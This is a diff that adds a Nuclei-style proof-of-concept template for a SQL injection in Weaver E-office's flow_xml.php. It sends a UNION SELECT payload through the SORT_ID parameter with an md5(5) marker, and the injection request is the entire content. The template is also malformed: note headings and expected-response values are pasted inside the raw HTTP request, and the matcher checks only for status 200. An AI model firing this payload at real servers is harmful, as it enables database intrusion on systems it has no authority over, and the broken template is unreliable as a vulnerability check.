@@ -1,0 +1,34 @@
+id: poc-olg6h74g6v2lb43o
+info:
+  name: 泛微 E-office flow_xml.php 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/olg6h74g6v2lb43o'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: olg6h74g6v2lb43o
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    e4da3b7fbbce2345d7772b0674a318d5
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
